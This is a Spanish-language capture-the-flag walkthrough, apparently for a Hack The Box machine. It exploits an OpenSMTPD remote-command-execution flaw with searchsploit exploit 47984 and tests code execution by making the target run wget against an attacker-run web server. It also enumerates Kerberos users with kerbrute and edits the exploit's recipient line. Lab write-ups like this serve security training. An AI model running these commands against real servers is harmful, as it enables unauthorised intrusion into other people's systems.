## Vulnerability Assessment {-}

### OpenSMTPD 2.0.0 {-}

Buscamos si existe exploit para este servicio

```bash
searchsploit opensmtpd
```

vemos que existe un exploit de typo RCE para la version 6.6.1. Como tenemos la version 2.0.0 pensamos que se puede utilizar.

```bash
searchsploit -m 47984
mv 47984.py smtpd-exploit.py
cat smtpd-exploit.py
```

Viendo el codigo vemos que necessita una ip un puerto y un commando. Vemos que utilza un servicio mail para enviar el comando
a un recipiant que es root. Intentamos lanzarlo tal cual.

1. Nos creamos un servidor web con python

    ```bash
    python -m http.server 80
    ```

1. Lanzamos el script con proxychains

    ```bash
    proxychains -q python3 smtpd_exploit.py 10.241.251.113 25 'wget 10.10.14.29'
    ```


Aqui vemos que no funcciona. puede ser porque el usuario root de este servicio no existe. Recordamos que hemos encontrado un email.
Tratamos de modificar el recipient para cambiar el root por j.nakazawa. Como el puerto 88 esta abierto primero utilizamos kerbrute para saber
si el usuario j.nakazawa existe.

1. creamos un fichero de usuarios y pegamos el usuario j.nakasawa
1. enumeramos usuarios con kerbrute

    ```bash
    kerbrute userenum --dc 10.10.10.224 -d realcorp.htb users
    ```

vemos que el usuario es valido. En el exploit, cambiamos el `s.send(b'RCPT TO:<root>\r\n')` por `s.send(b'RCPT TO:<j.nakazawa@realcorp.htb>\r\n')` y lanzamos 
nuevamente el exploit. Vemos que tenemos un GET en nuestro servidor web lo que significa que podemos ejecutar comandos y que tenemos conectividad con esta
maquina.